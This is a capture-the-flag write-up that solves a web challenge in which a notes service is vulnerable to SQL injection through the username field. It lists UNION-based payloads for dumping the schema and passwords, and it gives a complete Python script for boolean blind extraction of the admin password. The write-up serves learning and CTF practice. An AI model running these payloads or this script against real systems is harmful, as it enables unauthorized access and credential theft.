---
title: Sogeti Qualif - web - NoteBad.exe
ctf: "SogetiQuals"
year: "2019"
author: "zTeeed"
published: true
---

# [](#web)WEB: NoteBad.exe [ 493 points ] (Author: zTeeed)

## [](#presentation)Presentation

The website allows a registered user to create notes. By creating a few test acounts, we realised that the service is actually linking notes to usernames instead of a hidden user ID. This means that we can acess other users' notes by creating new accounts with the same username. We guessed that the flag could be found in the notes of the user `admin`. However, there is some sort of validation in the backend that forbids the creation of an account named `admin`.

Since the service associates notes to a username, that would mean that the server is actually fetching the notes with the following request:

```php
$query = "SELECT note from notes where username=$username;";
```

That would mean that the username parameter is injectable. Lets try some payloads.

<img src="/images/writeups/sogeti/web/01_add_note_example.png">

## [](#method-1)Method 1: Using the browser

To keep the writeup short, I'll only show the usernamed I registered the account with and the resulting notes found when connecting to the service.

```text
t35h' union select database()#
```

<img src="/images/writeups/sogeti/web/04_result_database.png">

```text
t35h' union select table_name from information_schema.tables#
```

<img src="/images/writeups/sogeti/web/05_result_tables.png">

```text
t35h' union select column_name from information_schema.columns#
```

<img src="/images/writeups/sogeti/web/06_result_columns.png">

```text
t35h' union select password from user limit 1#
```
<img src="/images/writeups/sogeti/web/07_result_password.png">

## [](#method-2)Method 2: Using an overkill python script

This is a typicall script that enable bruteforcing a column value based on a
boolean sql injection:

```python
#!/usr/bin/python3

import re, requests, time
from pwn import *


def connect(s, username, password):
    params = dict(username=username, password=password)
    url = 'http://quals.shadow-league.org:8001/register.php'
    s.get(url, params=params)
    url = 'http://quals.shadow-league.org:8001/index.php'
    return s.get(url, params=params)


def parse(content):
    pattern = b'<p class=\'note\'>(.*?)</p>'
    return re.findall(pattern, content)


def forge_payloads(val, flag):
    payload = ('admin\' or ((select ASCII(substr(password, {}, 1)) '
    'from user limit 1){}"{}")#')
    payload1 = payload.format(1+len(flag), '=', val)
    payload2 = payload.format(1+len(flag), '>', val)
    return payload1, payload2


def get_notes(payload, s, p):
    r = connect(s, payload, 'password')
    p.status(payload)
    notes = parse(r.content)
    return notes


def get_char_dichotomie(flag, s, p, p2):
    (a, b) = (33, 126)
    while a<=b:
        val = (a+b) // 2
        p.status('{}{}'.format(flag, chr(val)))

        payload1, payload2 = forge_payloads(val, flag)
        notes = get_notes(payload1, s, p2)
        if len(notes) > 1000:
            return chr(val)

        notes = get_notes(payload2, s, p2)
        if len(notes) > 1000:
            a = val + 1
        else:
            b = val - 1


def bruteforce(flag, s, p, p2):
    char = get_char_dichotomie(flag, s, p, p2)
    if char is None:
        return flag, None
    if char == '}':
        return flag + char, True
    return flag + char, False


def main():
    s = requests.session()
    flag = ''
    is_end = False
    with log.progress('flag') as p:
        with log.progress('payload') as p2:
            while is_end != True:
                flag, is_end = bruteforce(flag, s, p, p2)
                if is_end is not None:
                    continue
                p.failure(flag)
                return flag
            p.success(flag)
    return flag


def display_time(delay):
    m, s = divmod(delay, 60)
    m, s = int(m), int(s)
    if m != 0:
        return '{:02d} minutes {:02d} seconds'.format(m, s)
    return '{:02d} seconds'.format(s)


if __name__ == '__main__':
    start = time.time()
    main()
    disp = display_time(time.time()-start)
    print('[*] Solving time: {}'.format(disp))

```
